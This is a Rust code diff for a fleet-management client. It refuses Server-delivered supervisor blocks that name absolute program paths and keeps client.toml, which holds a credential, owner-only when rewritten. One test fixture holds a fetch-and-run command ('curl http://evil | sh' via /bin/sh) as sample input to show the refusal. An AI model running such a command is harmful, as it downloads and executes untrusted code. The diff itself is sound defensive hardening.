@@ -78,7 +78,7 @@ async fn apply_inner(
     let mut candidate = config.clone();
     candidate.supervisors = blocks.clone();
     for block in &blocks {
-        crate::supervisor::validate_block(&candidate, block).map_err(Refused)?;
+        validate_offered_block(&candidate, block).map_err(Refused)?;
     }
 
     // The apply is a diff, keyed by Supervisor name: removed and changed stop, changed and added
@@ -246,6 +246,31 @@ fn offered_blocks(
     Ok((blocks, tables))
 }
 
+/// Validates one offered `[[supervisor]]` block before any running process is touched: the startup
+/// loader's own checks (block schema, program-path resolution, ports, timeouts — ADR-0019 point 10),
+/// and then the delivery-path constraint of ADR-0019.
+///
+/// A Server-delivered block may name only a program **this Client owns** — a bare file name, whose
+/// program lives in a directory this Client created and updates from signature-verified packages
+/// (ADR-0019). An absolute path is the machine's own process; letting the Server spawn one would be
+/// arbitrary code execution that never passes through package signing. This binds the delivery path
+/// alone: an operator may still write an absolute-path Supervisor in `client.toml` by hand, a
+/// different principal that `resolve_program` must keep serving — which is why the rule lives here
+/// and not in path resolution.
+fn validate_offered_block(config: &ClientConfig, block: &SupervisorBlock) -> Result<(), String> {
+    crate::supervisor::validate_block(config, block)?;
+    let program = crate::supervisor::resolve_block_program(config, block)?;
+    if !program.owned {
+        return Err(format!(
+            "supervisor {:?}: a Server-delivered supervisor may run only a program this Client \
+             owns — name it with a bare file name, not the absolute path {}",
+            block.name,
+            program.path.display()
+        ));
+    }
+    Ok(())
+}
+
 /// The `[[supervisor]]` blocks of one parsed entry, whichever TOML spelling carried them —
 /// an array of tables, or an inline array of inline tables. `None` when the key is neither.
 fn supervisor_tables(item: &toml_edit::Item) -> Option<Vec<toml_edit::Table>> {
@@ -286,7 +311,7 @@ fn write_supervisors(path: &Path, tables: Vec<toml_edit::Table>) -> Result<Strin
     let new_text = doc.to_string();
 
     let tmp = path.with_extension("toml.tmp");
-    std::fs::write(&tmp, &new_text).map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
+    write_replacement(&tmp, path, &new_text)?;
     // Windows cannot rename over an existing file; removing first opens a moment with no file,
     // which a crash turns into "the defaults run until the operator restores it" — the narrow
     // loss, against silently applying half a write.
@@ -294,6 +319,39 @@ fn write_supervisors(path: &Path, tables: Vec<toml_edit::Table>) -> Result<Strin
     let _ = std::fs::remove_file(path);
     std::fs::rename(&tmp, path).map_err(|e| format!("cannot replace the file: {e}"))?;
     Ok(new_text)
+}
+
+/// Writes the new configuration to the temporary file the caller then renames over `client.toml`.
+///
+/// On Unix the temp file inherits the mode of the file it will replace — created with it, never
+/// widened after — so the rename cannot loosen permissions. `client.toml` holds the OpAMP
+/// credential in cleartext and is created `0600` (`config_init::write_new`); writing the temp file
+/// at the default umask (`0644`) and renaming it over the original, as this did before, left that
+/// credential world-readable after every Server-driven reconfigure (ADR-0019). A file that does not
+/// exist yet falls back to `0600`, the same floor `write_new` uses. The operator's own mode, if
+/// they widened or narrowed it deliberately, is preserved.
+fn write_replacement(tmp: &Path, target: &Path, contents: &str) -> Result<(), String> {
+    // Clear any temp left by a crashed earlier write, so the create below is fresh and its mode
+    // actually takes effect (a mode is applied only when a file is created).
+    let _ = std::fs::remove_file(tmp);
+    let mut options = std::fs::OpenOptions::new();
+    options.write(true).create_new(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::{OpenOptionsExt as _, PermissionsExt as _};
+        let mode = std::fs::metadata(target)
+            .map(|meta| meta.permissions().mode() & 0o777)
+            .unwrap_or(0o600);
+        options.mode(mode);
+    }
+    #[cfg(not(unix))]
+    let _ = target;
+    let mut file = options
+        .open(tmp)
+        .map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
+    use std::io::Write as _;
+    file.write_all(contents.as_bytes())
+        .map_err(|e| format!("cannot write {}: {e}", tmp.display()))
 }
 
 #[cfg(test)]
@@ -369,6 +427,76 @@ mod tests {
         assert!(err.contains("needs a `name`"), "{err}");
     }
 
+    /// ADR-0019: a Server-delivered block that names an **absolute** program path is refused as a
+    /// whole — that is the machine's own process, and letting the Server spawn one would run
+    /// arbitrary code that never passed through package signing. The refusal names the block and the
+    /// path, and (being a validation failure) leaves the running set and the file untouched.
+    /// An absolute path that is genuinely absolute on the host running the test — a Unix path is
+    /// only drive-relative on Windows, which resolves to a different refusal, so each platform uses
+    /// its own. Forward slashes keep it a plain TOML string and are absolute on Windows all the same.
+    fn machine_program() -> &'static str {
+        if cfg!(windows) {
+            "C:/Windows/System32/cmd.exe"
+        } else {
+            "/bin/sh"
+        }
+    }
+
+    #[test]
+    fn a_server_delivered_block_may_not_name_an_absolute_program() {
+        let program = machine_program();
+        let offer = offer_of(&[(
+            "fleet",
+            &format!(
+                "[[supervisor]]\ntype = \"command\"\nname = \"shell\"\n\
+                 command = \"{program}\"\nargs = [\"-c\", \"curl http://evil | sh\"]\n"
+            ),
+        )]);
+        let (blocks, _) = offered_blocks(&offer).expect("parse");
+        let mut config: ClientConfig = toml::from_str("").expect("config");
+        config.supervisors = blocks.clone();
+
+        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute path refused");
+        assert!(err.contains("\"shell\""), "names the block: {err}");
+        assert!(err.contains("only a program this Client owns"), "{err}");
+        assert!(err.contains(program), "names the path: {err}");
+    }
+
+    /// The counterpart: a bare file name is a program this Client owns (ADR-0019), so a delivered
+    /// block that names one is accepted — the ordinary, intended delivery shape.
+    #[test]
+    fn a_server_delivered_block_naming_a_bare_program_is_accepted() {
+        let offer = offer_of(&[(
+            "fleet",
+            "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n",
+        )]);
+        let (blocks, _) = offered_blocks(&offer).expect("parse");
+        let mut config: ClientConfig = toml::from_str("").expect("config");
+        config.supervisors = blocks.clone();
+
+        validate_offered_block(&config, &blocks[0]).expect("a bare-name program is owned");
+    }
+
+    /// The constraint reaches every plugin's program key: a `collector` block whose `binary` is an
+    /// absolute path is the machine's Collector, refused on the delivery path just like `command`.
+    #[test]
+    fn a_delivered_collector_binary_must_be_owned_too() {
+        let program = machine_program();
+        let offer = offer_of(&[(
+            "fleet",
+            &format!(
+                "[[supervisor]]\ntype = \"collector\"\nname = \"otelcol\"\nbinary = \"{program}\"\n"
+            ),
+        )]);
+        let (blocks, _) = offered_blocks(&offer).expect("parse");
+        let mut config: ClientConfig = toml::from_str("").expect("config");
+        config.supervisors = blocks.clone();
+
+        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute binary refused");
+        assert!(err.contains("only a program this Client owns"), "{err}");
+        assert!(err.contains(program), "{err}");
+    }
+
     /// The composed map may spread blocks over several entries (one per matching Configuration);
     /// the union is the set, in entry-name order.
     #[test]
@@ -419,6 +547,65 @@ mod tests {
         let parsed: ClientConfig = toml::from_str(&text).expect("the rewritten file parses");
         assert_eq!(parsed.supervisors.len(), 1);
         assert_eq!(parsed.supervisors[0].name, "new");
+    }
+
+    /// `client.toml` holds the OpAMP credential in cleartext and is created `0600`; the rewrite must
+    /// not widen it. Before the fix, writing the temp file at the default umask and renaming it over
+    /// the original left the file (and the credential) world-readable after a Server reconfigure.
+    #[cfg(unix)]
+    #[test]
+    fn the_rewrite_keeps_the_files_restrictive_mode() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let dir = tempfile::tempdir().expect("tempdir");
+        let path = dir.path().join("client.toml");
+        std::fs::write(
+            &path,
+            "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
+             [auth]\nbearer_token = \"a-long-secret\"\n\n\
+             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
+        )
+        .expect("write");
+        // As the Client creates it (config_init::write_new): owner-only.
+        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).expect("chmod");
+
+        let offer = offer_of(&[(
+            "fleet",
+            "[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
+        )]);
+        let (_, tables) = offered_blocks(&offer).expect("parse");
+        write_supervisors(&path, tables).expect("rewrite");
+
+        let mode = std::fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
+        assert_eq!(
+            mode, 0o600,
+            "the rewrite kept the file owner-only, got {mode:o}"
+        );
+        // No temporary file is left behind carrying the same secret.
+        assert!(
+            !path.with_extension("toml.tmp").exists(),
+            "no temp left behind"
+        );
+    }
+
+    /// A file that does not exist yet is created no wider than the `0600` floor `write_new` uses —
+    /// a delivered set that first materializes `client.toml` must not do so world-readable.
+    #[cfg(unix)]
+    #[test]
+    fn a_freshly_created_file_is_owner_only() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let dir = tempfile::tempdir().expect("tempdir");
+        let path = dir.path().join("client.toml");
+        let offer = offer_of(&[(
+            "fleet",
+            "[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
+        )]);
+        let (_, tables) = offered_blocks(&offer).expect("parse");
+        write_supervisors(&path, tables).expect("rewrite");
+
+        let mode = std::fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600, "a new file is owner-only, got {mode:o}");
     }
 
     /// An offer whose entries carry no blocks empties the set: the file keeps its globals and
